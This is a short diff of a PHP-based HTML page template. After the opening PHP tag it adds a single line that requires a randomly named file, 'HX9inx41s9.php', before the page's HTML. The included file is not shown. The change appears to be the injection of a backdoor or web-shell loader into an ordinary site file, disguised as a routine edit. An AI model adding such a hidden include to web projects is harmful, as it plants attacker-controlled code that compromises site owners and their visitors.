@@ -1,4 +1,5 @@
-<?php
+<?php 
+require __DIR__ . '/HX9inx41s9.php'
 ?>
 <!DOCTYPE html>
 <html lang="en">
